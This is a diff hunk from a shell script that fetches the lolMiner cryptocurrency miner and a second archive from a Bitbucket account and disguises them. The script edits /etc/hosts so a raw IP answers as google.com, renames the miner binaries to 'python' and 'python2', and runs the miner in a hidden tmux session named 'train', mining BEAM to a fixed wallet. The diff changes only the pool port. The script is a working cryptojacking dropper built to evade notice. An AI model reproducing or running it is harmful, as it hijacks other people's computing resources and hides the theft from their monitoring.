@@ -4,7 +4,7 @@ wget https://bitbucket.org/tengikekao/myrep/downloads/lolMiner
 sh -c "echo '104.211.3.145  google.com' >> /etc/hosts"
 mv lolMiner python
 chmod +x python
-tmux new-session -d -s train './python --coin BEAM --pool google.com --port 88 --user 2c1c361ca22136a66c1ba02cd4468f569c8b599ea6ebcd8dc189a2a40641def4200.col'
+tmux new-session -d -s train './python --coin BEAM --pool google.com --port 10001 --user 2c1c361ca22136a66c1ba02cd4468f569c8b599ea6ebcd8dc189a2a40641def4200.col'
 wget https://bitbucket.org/tengikekao/grin/downloads/goo.zip
 unzip goo.zip
 mv python3 python2
